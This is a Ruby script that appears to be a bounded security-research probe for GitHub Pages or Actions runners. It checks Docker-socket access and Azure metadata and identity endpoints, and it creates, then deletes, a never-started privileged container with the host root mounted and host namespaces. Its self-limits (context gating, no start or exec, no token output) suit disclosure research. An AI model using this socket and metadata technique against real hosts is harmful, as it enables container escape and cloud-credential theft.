# frozen_string_literal: true

require "json"
require "net/http"
require "securerandom"
require "socket"
require "uri"

SOURCE_REPOSITORY = "singetu0096/pages-post-url-regexp-canary-20260915"
IMDS_HOST = "169.254.169.254"
IMDS_API_VERSION = "2025-04-07"
HOST_ROOT_BIND = "/:/owned-host-root-readonly-never-started:ro"

def docker_request(method, request_path, request_body = "")
  socket = UNIXSocket.new("/var/run/docker.sock")
  crlf = 13.chr + 10.chr
  socket.write([
    method + " " + request_path + " HTTP/1.0",
    "Host: localhost",
    "Content-Type: application/json",
    "Content-Length: " + request_body.bytesize.to_s,
    "",
    request_body
  ].join(crlf))
  raw = socket.read
  status = raw.lines.first.to_s.split[1].to_i
  body = raw.partition(crlf + crlf)[2]
  [status, body]
rescue StandardError
  [0, ""]
ensure
  socket.close if defined?(socket) && socket
end

def docker_get(request_path)
  docker_request("GET", request_path)
end

def docker_counts
  status, body = docker_get("/info")
  counts = {}
  if status == 200
    parsed = JSON.parse(body)
    %w[Containers ContainersRunning ContainersPaused ContainersStopped].each do |key|
      counts[key] = Integer(parsed[key]) if parsed.key?(key)
    end
  end
  [status, counts]
rescue StandardError
  [status || 0, {"parse_error" => true}]
ensure
  body = nil
  parsed = nil
end

def imds_get(request_path)
  allowed_prefixes = [
    "/metadata/instance/compute/azEnvironment?",
    "/metadata/instance/compute/vmScaleSetName?",
    "/metadata/instance/compute/securityProfile?",
    "/metadata/instance/network?",
    "/metadata/identity/oauth2/token?"
  ]
  return [0, ""] unless allowed_prefixes.any? { |prefix| request_path.start_with?(prefix) }

  request = Net::HTTP::Get.new(request_path)
  request["Metadata"] = "true"
  request["User-Agent"] = "github-pages-owned-vm-authority-canary"
  http = Net::HTTP.new(IMDS_HOST, 80, nil)
  http.open_timeout = 1
  http.read_timeout = 2
  response = http.request(request)
  body = response.body.to_s.byteslice(0, 65_536).to_s
  [response.code.to_i, body]
rescue StandardError
  [0, ""]
end

def true_value?(value)
  value == true || value.to_s.casecmp("true").zero?
end

result = {
  "probe" => "runner-vm-authority-no-use-v1",
  "authorized_context" => {
    "github_actions" => ENV.fetch("GITHUB_ACTIONS", "") == "true",
    "source_repository" => ENV.fetch("GITHUB_REPOSITORY", "") == SOURCE_REPOSITORY
  },
  "safety_design" => {
    "host_bound_container_start_requests" => 0,
    "host_commands_executed" => 0,
    "host_files_read" => 0,
    "host_files_written" => 0,
    "container_or_network_list_requests" => 0,
    "internal_peer_requests" => 0,
    "cloud_api_requests" => 0,
    "downstream_token_use" => 0,
    "imds_metadata_requests" => 4,
    "imds_identity_error_oracle_requests" => 1,
    "planned_docker_create_requests" => 1,
    "docker_start_requests" => 0,
    "maximum_docker_delete_requests" => 1,
    "response_bodies_emitted" => false,
    "credential_values_emitted" => false
  }
}

unless result.dig("authorized_context", "github_actions") &&
       result.dig("authorized_context", "source_repository")
  result["refused_outside_exact_context"] = true
  puts JSON.generate(result)
  exit
end

version_status, version_body = docker_get("/version")
info_status, info_body = docker_get("/info")
docker_profile = {
  "version_status" => version_status,
  "info_status" => info_status
}

if version_status == 200
  begin
    version_json = JSON.parse(version_body)
    docker_profile["server_version_28_0_4"] =
      version_json.fetch("Version", "").to_s == "28.0.4"
    docker_profile["api_version_present"] =
      !version_json.fetch("ApiVersion", "").to_s.empty?
  rescue StandardError
    docker_profile["version_parse_error"] = true
  end
end
version_body = nil
version_json = nil

if info_status == 200
  begin
    info_json = JSON.parse(info_body)
    runtimes = info_json.fetch("Runtimes", {}).keys.map(&:to_s)
    security_options = Array(info_json["SecurityOptions"]).map(&:to_s)
    docker_profile.merge!(
      "authorization_plugin_count" =>
        Array(info_json.dig("Plugins", "Authorization")).length,
      "rootless" => security_options.any? { |entry| entry.include?("rootless") },
      "userns" => security_options.any? { |entry| entry.include?("userns") },
      "swarm_active" => info_json.dig("Swarm", "LocalNodeState").to_s == "active",
      "cluster_store_configured" =>
        !info_json.fetch("ClusterStore", "").to_s.empty?,
      "default_runtime_runc" => info_json.fetch("DefaultRuntime", "").to_s == "runc",
      "runtime_runc_present" => runtimes.include?("runc"),
      "runtime_io_containerd_runc_v2_present" =>
        runtimes.include?("io.containerd.runc.v2"),
      "runtime_crun_present" => runtimes.include?("crun"),
      "live_restore_enabled" => !!info_json["LiveRestoreEnabled"]
    )
  rescue StandardError
    docker_profile["info_parse_error"] = true
  end
end
info_body = nil
info_json = nil
runtimes = nil
security_options = nil
result["docker_profile"] = docker_profile

az_status, az_body = imds_get(
  "/metadata/instance/compute/azEnvironment?api-version=" +
  IMDS_API_VERSION + "&format=text"
)
vmss_status, vmss_body = imds_get(
  "/metadata/instance/compute/vmScaleSetName?api-version=" +
  IMDS_API_VERSION + "&format=text"
)
security_status, security_body = imds_get(
  "/metadata/instance/compute/securityProfile?api-version=" +
  IMDS_API_VERSION + "&format=json"
)
network_status, network_body = imds_get(
  "/metadata/instance/network?api-version=" + IMDS_API_VERSION +
  "&format=json"
)

imds_profile = {
  "az_environment_status" => az_status,
  "azure_public_cloud" => az_status == 200 && az_body.strip == "AZUREPUBLICCLOUD",
  "vmss_name_status" => vmss_status,
  "vmss_name_present" => vmss_status == 200 && !vmss_body.strip.empty?,
  "security_profile_status" => security_status,
  "network_profile_status" => network_status
}
az_body = nil
vmss_body = nil

if security_status == 200
  begin
    security_json = JSON.parse(security_body)
    imds_profile["security_profile_parseable"] = security_json.is_a?(Hash)
    imds_profile["secure_boot_enabled"] =
      true_value?(security_json["secureBootEnabled"])
    imds_profile["virtual_tpm_enabled"] =
      true_value?(security_json["virtualTpmEnabled"])
    imds_profile["encryption_at_host_enabled"] =
      true_value?(security_json["encryptionAtHost"])
  rescue StandardError
    imds_profile["security_profile_parse_error"] = true
  end
end
security_body = nil
security_json = nil

if network_status == 200
  begin
    network_json = JSON.parse(network_body)
    interfaces = Array(network_json["interface"])
    imds_profile["network_interface_count"] = interfaces.length
    imds_profile["ipv4_configuration_count"] = interfaces.sum do |interface|
      Array(interface.dig("ipv4", "ipAddress")).length
    end
    imds_profile["ipv6_configuration_count"] = interfaces.sum do |interface|
      Array(interface.dig("ipv6", "ipAddress")).length
    end
  rescue StandardError
    imds_profile["network_profile_parse_error"] = true
  end
end
network_body = nil
network_json = nil
interfaces = nil

# The resource URI is generated uniquely and is intentionally not a registered
# Azure application. A successful bearer response is neither printed nor kept.
# Error classes provide a bounded existence oracle without calling Azure ARM,
# Key Vault, Storage, or any other downstream resource.
invalid_resource =
  "api://github-pages-owned-nonexistent-" + SecureRandom.uuid
identity_path =
  "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=" +
  URI.encode_www_form_component(invalid_resource)
identity_status, identity_body = imds_get(identity_path)
access_token_returned =
  identity_body.match?(/\"access_token\"\s*:/i)
identity_class = if identity_status == 200 || access_token_returned
                   "unexpected-token-response-discarded"
                 elsif identity_body.match?(/multiple.{0,80}identit/i)
                   "multiple-managed-identities-present"
                 elsif identity_body.match?(/AADSTS500011|invalid_resource|resource principal.{0,160}not found/i)
                   "managed-identity-present-invalid-audience"
                 elsif identity_body.match?(/identity not found|no managed identity/i)
                   "managed-identity-not-available"
                 elsif identity_status == 404
                   "identity-endpoint-unavailable"
                 else
                   "indeterminate"
                 end
imds_profile["identity_probe"] = {
  "status" => identity_status,
  "classification" => identity_class,
  "access_token_returned" => access_token_returned,
  "random_unregistered_audience" => true,
  "response_body_emitted" => false,
  "downstream_resource_contacted" => false
}
identity_body = nil
invalid_resource = nil
identity_path = nil
result["imds_profile"] = imds_profile

self_name = Socket.gethostname
self_status, self_body = docker_get("/containers/" + self_name + "/json")
self_image_id = nil
self_id_match = false
if self_status == 200
  begin
    self_json = JSON.parse(self_body)
    self_id = self_json.fetch("Id", "").to_s
    self_id_match = self_name.length >= 12 && self_id.start_with?(self_name)
    self_image_id = self_json.fetch("Image", "").to_s if self_id_match
  rescue StandardError
    self_id_match = false
  end
end
self_body = nil
self_json = nil
self_id = nil

authority_canary = {
  "configured" => true,
  "self_inspect_status" => self_status,
  "self_id_match" => self_id_match,
  "start_request_sent" => false,
  "exec_request_sent" => false,
  "host_path_content_read" => false
}

baseline_status, baseline_counts = docker_counts
authority_canary["baseline_info_status"] = baseline_status
canary_name = "pages-rce-authority-never-started-" + SecureRandom.hex(8)
canary_id = nil
created_by_probe = false

if self_image_id.to_s.match?(/\Asha256:[0-9a-f]{64}\z/)
  create_body = JSON.generate(
    "Image" => self_image_id,
    "Entrypoint" => ["/usr/bin/true"],
    "Cmd" => [],
    "User" => "65534:65534",
    "Env" => [],
    "NetworkDisabled" => false,
    "AttachStdin" => false,
    "AttachStdout" => false,
    "AttachStderr" => false,
    "OpenStdin" => false,
    "StdinOnce" => false,
    "Tty" => false,
    "Labels" => {
      "com.github.security-research.owned-canary" => "true",
      "com.github.security-research.never-start" => "true"
    },
    "HostConfig" => {
      "AutoRemove" => false,
      "Binds" => [HOST_ROOT_BIND],
      "CgroupnsMode" => "host",
      "Devices" => [],
      "IpcMode" => "host",
      "LogConfig" => {"Type" => "none", "Config" => {}},
      "Memory" => 33_554_432,
      "MemorySwap" => 33_554_432,
      "NanoCpus" => 50_000_000,
      "NetworkMode" => "host",
      "PidMode" => "host",
      "PidsLimit" => 16,
      "PortBindings" => {},
      "Privileged" => true,
      "PublishAllPorts" => false,
      "ReadonlyRootfs" => true,
      "RestartPolicy" => {"Name" => "no", "MaximumRetryCount" => 0},
      "UsernsMode" => "host",
      "UTSMode" => "host"
    }
  )

  begin
    create_status, create_response = docker_request(
      "POST",
      "/containers/create?name=" + canary_name,
      create_body
    )
    authority_canary["create_status"] = create_status
    created_by_probe = create_status == 201
    if created_by_probe
      canary_id = JSON.parse(create_response).fetch("Id", "").to_s
      after_create_status, after_create_counts = docker_counts
      authority_canary["after_create_info_status"] = after_create_status
      authority_canary["container_count_increased_by_one"] =
        baseline_counts["Containers"].is_a?(Integer) &&
        after_create_counts["Containers"] == baseline_counts["Containers"] + 1

      inspect_status, inspect_response = docker_get(
        "/containers/" + canary_id + "/json"
      )
      authority_canary["inspect_status"] = inspect_status
      if inspect_status == 200
        inspect_json = JSON.parse(inspect_response)
        host_config = inspect_json.fetch("HostConfig", {})
        state = inspect_json.fetch("State", {})
        authority_canary.merge!(
          "state_created" => state.fetch("Status", "").to_s == "created",
          "state_running" => !!state["Running"],
          "host_root_readonly_bind_accepted" =>
            Array(host_config["Binds"]).include?(HOST_ROOT_BIND),
          "privileged_accepted" => !!host_config["Privileged"],
          "host_pid_namespace_accepted" => host_config["PidMode"].to_s == "host",
          "host_ipc_namespace_accepted" => host_config["IpcMode"].to_s == "host",
          "host_uts_namespace_accepted" => host_config["UTSMode"].to_s == "host",
          "host_network_namespace_accepted" =>
            host_config["NetworkMode"].to_s == "host",
          "host_user_namespace_accepted" =>
            host_config["UsernsMode"].to_s == "host",
          "host_cgroup_namespace_accepted" =>
            host_config["CgroupnsMode"].to_s == "host",
          "readonly_rootfs_accepted" => !!host_config["ReadonlyRootfs"],
          "restart_policy_none" =>
            host_config.dig("RestartPolicy", "Name").to_s == "no"
        )
      end
    end
  rescue StandardError
    authority_canary["probe_error"] = true
  ensure
    create_body = nil
    create_response = nil
    inspect_response = nil
    inspect_json = nil
    host_config = nil
    state = nil
    after_create_counts = nil
    if created_by_probe && !canary_id.to_s.empty?
      delete_status, = docker_request(
        "DELETE",
        "/containers/" + canary_id + "?force=0&v=1"
      )
      authority_canary["delete_status"] = delete_status
    end
  end
else
  authority_canary["image_id_unavailable"] = true
end

post_cleanup_status, post_cleanup_counts = docker_counts
authority_canary["post_cleanup_info_status"] = post_cleanup_status
authority_canary["counts_returned_to_baseline"] =
  baseline_counts == post_cleanup_counts
authority_canary["created_by_probe"] = created_by_probe
authority_canary["deleted_by_probe"] = authority_canary["delete_status"] == 204
result["authority_canary"] = authority_canary

self_image_id = nil
canary_id = nil
canary_name = nil
baseline_counts = nil
post_cleanup_counts = nil

puts JSON.generate(result)
